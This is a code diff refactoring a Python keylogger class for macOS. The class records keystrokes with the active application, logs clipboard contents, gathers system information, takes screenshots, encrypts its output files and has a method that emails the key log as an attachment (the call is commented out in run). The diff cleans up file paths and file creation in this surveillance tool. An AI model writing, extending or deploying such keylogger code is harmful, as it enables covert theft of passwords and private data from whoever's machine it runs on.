@@ -26,9 +26,9 @@ class Keylogger:
         self.iterations = iterations
         self.buffer_size = buffer_size
         self.output_dir = "out"
-        self.log_file = os.path.join(self.output_dir, "/log.txt")
-        self.clipboard_file = os.path.join(self.output_dir, "/clipboard.txt")
-        self.sys_file = os.path.join(self.output_dir, "/sysinfo.txt")
+        self.log_path = os.path.join(self.output_dir, "log.txt")
+        self.clipboard_path = os.path.join(self.output_dir, "clipboard.txt")
+        self.sys_path = os.path.join(self.output_dir, "sysinfo.txt")
         
         self.keys = []
         self.apps = []
@@ -54,12 +54,6 @@ class Keylogger:
             self.count = 0
             self.keys.clear()
             self.apps.clear()
-
-    def on_release(self, key):
-        if key == Key.esc:
-            return False
-        if self.current_time > self.stopping_time:
-            return False
         
     def on_release(self, key):
         if key == Key.esc or self.current_time > self.stopping_time:
@@ -71,7 +65,7 @@ class Keylogger:
     # Converts each key press into a string and appends to the output file, with spaces being converted into a new line
     def write_file(self):
         # Logs each key press
-        with open("out/log.txt", "a") as file:
+        with open(self.log_path, "a") as file:
             nl = "\n"
             self.last_active_app = self.apps[0]
 
@@ -95,12 +89,27 @@ class Keylogger:
                     file.write(k)
                     
     # Initialises log file with column names
-    def init_log_file(self):
+    def init_files(self):
+        os.makedirs(self.output_dir, exist_ok=True) 
+
+
         # Creates out/log.txt if it doesnt already exist
-        if (os.path.isfile("out/log.txt") != True):
-            with open("out/log.txt", "x") as file:
+        if (os.path.isfile(self.log_path) != True):
+            with open(self.log_path, "x") as file:
                 print("log.txt not found, creating file.\n")
                 file.write("Timestamp, Current Application, Keys pressed\n")
+
+        # Creates out/clipboard.txt if it doesnt already exist
+        if (os.path.isfile(self.clipboard_path) != True):
+            with open(self.clipboard_path, "a") as file:
+                print("clipboard.txt not found, creating file.\n")
+                file.write("")
+
+        # Creates out/sysinfo.txt if it doesnt already exist
+        if (os.path.isfile(self.sys_path) != True):
+            with open(self.sys_path, "a") as file:
+                print("sysinfo.txt not found, creating file.\n")
+                file.write("")
 
     # Gets system information about host and logs it to out/sysinfo.txt
     def log_sys_info(self):
@@ -131,14 +140,9 @@ class Keylogger:
             f"Architecture: {arch}\n\n"
         )
 
-        # If file exists open in 'append' mode, else create file and write system information
-        if (os.path.isfile("out/sysinfo.txt") != True):
-            with open("out/sysinfo.txt", "x") as file:
-                print("sysinfo.txt not found, creating file.\n")
-                file.write(sysinfo)
-        else:
-            with open("out/sysinfo.txt", "a") as file:
-                file.write(sysinfo)
+        # Write system information to out/sysinfo.txt
+        with open(self.sys_path, "a") as file:
+            file.write(sysinfo)
 
     # Constructs and sends an email to specified recipient and attaches log files.
     def send_email(self):
@@ -154,9 +158,8 @@ class Keylogger:
 
         msg.attach(MIMEText(body, 'plain'))
 
-        # Open and attach file
-        filename = "log.txt"
-        attachment = open("out/log.txt", "rb")
+        # attach file
+        attachment = open(self.log_path, "rb")
 
         # instance of MIMEBase and named as p
         p = MIMEBase('application', 'octet-stream')
@@ -187,15 +190,9 @@ class Keylogger:
         pb = NSPasteboard.generalPasteboard()
         pbstring = pb.stringForType_(NSStringPboardType)
 
-        if (os.path.isfile("out/clipboard.txt") != True):
-            with open("out/clipboard.txt", "x") as file:
-                print("clipboard.txt not found, creating file.\n")
-                file.write(f"Clipboard Log @ {datetime.now().ctime()}")
-                file.write(pbstring + "\n")
-        else:
-            with open("out/clipboard.txt", "a") as file:
-                file.write(f"Clipboard Log @ {datetime.now().ctime()}\n")
-                file.write(pbstring + "\n\n")
+        with open(self.clipboard_path, "a") as file:
+            file.write(f"Clipboard Log @ {datetime.now().ctime()}\n")
+            file.write(pbstring + "\n\n")
 
     # takes a screenshot and saves it to /out directory
     def take_screenshot(self, iteration_count):
@@ -226,7 +223,6 @@ class Keylogger:
         fernet = Fernet(key)
 
         for filename in os.listdir(self.output_dir):
-            if filename.endswith('.txt'):
                 filepath = os.path.join(self.output_dir, filename)
                 with open(filepath, "rb") as file:
                     data = file.read()
@@ -234,10 +230,8 @@ class Keylogger:
                 with open(filepath, "wb") as file:
                     file.write(encrypted_data)
 
-# create function to create all files
-
     def run(self):
-        self.init_log_file()
+        self.init_files()
         self.log_sys_info()
 
         iteration_count = 0
@@ -265,8 +259,10 @@ class Keylogger:
         # self.send_email()
         print("Keylogger finished.")
 
-
 if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.run()
+
+# Potential improvements
+# 
     
